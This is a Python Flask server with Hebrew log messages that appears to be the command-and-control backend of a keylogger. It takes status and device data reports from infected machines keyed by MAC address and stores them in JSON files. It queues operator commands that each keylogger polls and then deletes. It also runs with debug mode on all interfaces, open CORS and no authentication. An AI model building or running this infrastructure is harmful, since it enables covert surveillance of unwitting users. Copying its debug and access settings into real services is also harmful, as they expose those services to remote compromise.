from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

REQUIRED_FILES = {
    "device_status.json": [],
    "change_device_status.json": {}
}

def ensure_files_exist():
    for file_name, default_data in REQUIRED_FILES.items():
        if not os.path.exists(file_name):
            try:
                with open(file_name, "w", encoding="utf-8") as f:
                    json.dump(default_data, f, ensure_ascii=False, indent=4)
                print(f"✅ נוצר קובץ ברירת מחדל: {file_name}")
            except Exception as e:
                print(f"❌ שגיאה ביצירת קובץ {file_name}: {e}")

def write_to_device_status(data):
    try:
        file_path = "device_status.json"
        mac_address = data.get("mac_address")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    data_json = json.load(file)
                    if not isinstance(data_json, list):
                        data_json = []
                except json.JSONDecodeError:
                    data_json = []
        else:
            data_json = []
        data["lastSeen"] = datetime.now().strftime("%d/%m/%Y %H:%M")
        device_index = next((i for i, item in enumerate(data_json) if item.get("mac_address") == mac_address), -1)
        if device_index >= 0:
            data_json[device_index].update(data)
        else:
            data_json.append(data)
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("❌ שגיאה בכתיבת device_status.json:", e)

def write_to_change_status(data):
    try:
        file_path = "change_device_status.json"
        mac_address = data.get("mac_address")
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    status_json = json.load(file)
                    if not isinstance(status_json, dict):
                        status_json = {}
                except json.JSONDecodeError:
                    status_json = {}
        else:
            status_json = {}
        status_json[mac_address] = data
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(status_json, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("❌ שגיאה בכתיבת change_device_status.json:", e)

@app.route('/api/status/update', methods=['POST'])
def status_update():
    print("📡 התחלת טיפול בבקשת עדכון סטטוס מהקיי-לוגר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
        write_to_device_status(data)
        print("✅ נתוני סטטוס מהקיי-לוגר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהקיי-לוגר:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/data/upload', methods=['POST'])
def upload_data():
    print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400
        write_to_device_status(data)
        print("✅ נתוני מחשב מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    print("📡 התחלת טיפול בבקשת שליפת סטטוסים לכל המכשירים מהאתר")
    try:
        with open("device_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            if not isinstance(data_json, list):
                data_json = []
            print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify([]), 200
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500

@app.route('/api/status/check', methods=['GET'])
def check_status():
    print("📡 התחלת בדיקת סטטוס מהמכשיר לפי MAC (מהקיי-לוגר)")
    mac_address = request.headers.get("mac-address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400
    try:
        file_path = "change_device_status.json"
        with open(file_path, "r", encoding="utf-8") as file:
            status_json = json.load(file)
            if not isinstance(status_json, dict):
                status_json = {}
        device_status = status_json.get(mac_address)
        if not device_status:
            return jsonify({"message": "No status found"}), 404
        print("✅ סטטוס אחרון מהקיי-לוגר עבור MAC", mac_address, ":", device_status)
        del status_json[mac_address]
        with open(file_path, "w", encoding="utf-8") as file:
            json.dump(status_json, file, ensure_ascii=False, indent=4)
        return jsonify(device_status)
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print("❌ שגיאה בטיפול בבקשת /api/status/check:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/status/change', methods=['POST'])
def change_status():
    print("📡 התחלת טיפול בבקשת שינוי סטטוס מהאתר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400

        mac_address = data["mac_address"]

        # עדכן את השם ישירות ב-device_status.json
        if "name" in data:
            name_update = {"mac_address": mac_address, "name": data["name"]}
            write_to_device_status(name_update)

        # הכן נתונים עבור change_device_status.json (בלי השם)
        change_data = {k: v for k, v in data.items() if k != "name"}
        if change_data:  # שמור רק אם יש נתונים מעבר לשם
            write_to_change_status(change_data)

        print("✅ נתוני סטטוס מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהאתר:", e)
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    ensure_files_exist()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
